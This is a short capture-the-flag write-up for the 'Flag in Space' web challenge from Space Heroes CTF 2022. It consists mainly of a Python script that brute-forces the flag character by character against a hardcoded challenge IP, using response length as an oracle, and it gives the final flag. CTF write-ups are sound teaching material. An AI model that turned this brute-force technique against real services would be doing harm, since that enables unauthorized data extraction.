---
name: Flag in Space (2022)
event: Space Heroes CTF 2022
category: Web
description: Writeup for Flag in Space (Web) - Space Heroes CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Flag in Space

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/8oycV0Bsb5k/0.jpg)](https://youtu.be/8oycV0Bsb5k "Space Heroes CTF 2022: Flag in Space")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *
import requests
import string

context.log_level = 'debug'
url = 'http://172.105.154.14/?flag=shctf{'

response = requests.get(url + '\x00')  # Initial request
correct_response = len(response.text)
info('intitial response length: %d', correct_response)

# Loop until we see the flag
while '}' not in url:
    # Loop possible chars (string.printable)
    for char in '{_}' + string.ascii_lowercase + string.digits:
        response = requests.get(url + char)
        # If this is the correct char, update
        if len(response.text) > correct_response:
            correct_response = len(response.text)
            url = url + char
            info(url)
            break

# Flag plz
warn(url)
```
{% endcode %}

Flag: `shctf{2_explor3_fronti3r}`
